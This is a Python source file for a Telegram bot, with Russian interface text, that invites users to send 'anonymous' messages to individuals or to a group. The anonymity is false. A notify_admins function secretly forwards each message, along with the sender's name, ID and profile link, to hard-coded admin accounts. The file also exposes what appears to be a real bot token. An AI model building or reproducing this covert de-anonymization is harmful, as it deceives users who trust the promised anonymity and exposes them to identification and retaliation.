import asyncio
import sqlite3
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.client.default import DefaultBotProperties

# --- НАСТРОЙКИ ---
TOKEN = "8720756817:AAFFksi2_kKScmLW1XVREa1WUtbcImAyeHE"
ADMIN_IDS = [7919798306, 5275461907]
GROUP_ID = -1003784828350  # <--- ОБЯЗАТЕЛЬНО ЗАМЕНИ НА ID СВОЕЙ ГРУППЫ

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode='HTML'))
dp = Dispatcher()

# --- КЛАВИАТУРА ---
def get_main_keyboard(user_id):
    buttons = [
        [KeyboardButton(text="👤 Моя личная ссылка")],
        [KeyboardButton(text="📢 Ссылка для группы")]
    ]
    if user_id in ADMIN_IDS:
        buttons.append([KeyboardButton(text="📊 Статистика")])
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

@dp.message(CommandStart())
async def start(message: types.Message):
    init_db()
    conn = sqlite3.connect("users.db")
    conn.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
    conn.commit()
    conn.close()

    args = message.text.split()
    # Если перешли по ссылке для группы
    if len(args) > 1 and args[1] == "group":
        await message.answer("📢 <b>Режим отправки в группу</b>\n\nНапиши сообщение ниже (нажми 'Ответить'), и я опубликую его в группе!", reply_markup=get_main_keyboard(message.from_user.id))
    # Если по личной ссылке
    elif len(args) > 1 and args[1].isdigit():
        await message.answer(f"🤫 Пиши анонимно для пользователя <code>{args[1]}</code>\n\n(Нажми 'Ответить')", reply_markup=get_main_keyboard(message.from_user.id))
    else:
        await message.answer("Привет! Выбери нужную ссылку в меню ниже:", reply_markup=get_main_keyboard(message.from_user.id))

# --- ОБРАБОТКА КНОПОК ---

@dp.message(F.text == "👤 Моя личная ссылка")
async def show_personal_link(message: types.Message):
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start={message.from_user.id}"
    await message.answer(f"Твоя личная ссылка (для вопросов тебе):\n<code>{link}</code>")

@dp.message(F.text == "📢 Ссылка для группы")
async def show_group_link(message: types.Message):
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start=group"
    await message.answer(f"Ссылка для закрепа в группе (для анонимок в чат):\n<code>{link}</code>")

@dp.message(F.text == "📊 Статистика")
async def show_stats(message: types.Message):
    if message.from_user.id in ADMIN_IDS:
        conn = sqlite3.connect("users.db")
        count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        conn.close()
        await message.answer(f"Всего пользователей: <b>{count}</b>")

# --- ОБРАБОТКА АНОНИМОК ---

@dp.message(F.text)
async def handle_msg(message: types.Message):
    if not message.reply_to_message:
        return

    # Отправка в группу
    if "опубликую его в группе" in message.reply_to_message.text:
        try:
            await bot.send_message(GROUP_ID, f"📥 <b>Новое анонимное сообщение:</b>\n\n{message.text}")
            await message.answer("✅ Опубликовано в группе!")
            await notify_admins(message, "В ГРУППУ")
        except:
            await message.answer("❌ Ошибка: бот не может отправить сообщение в группу. Проверь ID и права админа!")

    # Личная отправка
    elif "Пиши анонимно для пользователя" in message.reply_to_message.text:
        try:
            target_id = re.findall(r'\d+', message.reply_to_message.text)[0]
            await bot.send_message(target_id, f"📥 <b>Новый анонимный вопрос:</b>\n\n{message.text}")
            await message.answer("✅ Отправлено лично!")
            await notify_admins(message, f"ЛИЧНО (ID {target_id})")
        except:
            await message.answer("❌ Ошибка доставки.")

async def notify_admins(message, mode):
    u = message.from_user
    u_link = f"<a href='tg://user?id={u.id}'>{u.full_name}</a>"
    log = f"🕵️ <b>ЛОГ</b>\nОт: {u_link}\nКуда: {mode}\nТекст: {message.text}"
    for admin_id in ADMIN_IDS:
        try: await bot.send_message(admin_id, log)
        except: pass

async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
